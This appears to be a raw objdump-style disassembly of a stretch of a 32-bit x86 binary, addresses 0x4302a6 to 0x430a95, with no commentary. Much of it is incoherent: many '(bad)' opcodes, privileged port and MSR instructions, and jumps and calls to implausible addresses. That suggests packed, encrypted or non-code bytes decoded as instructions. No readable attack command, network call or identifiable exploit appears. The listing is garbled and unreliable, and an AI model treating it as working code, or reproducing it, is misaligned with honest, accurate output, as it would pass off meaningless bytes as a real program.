  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
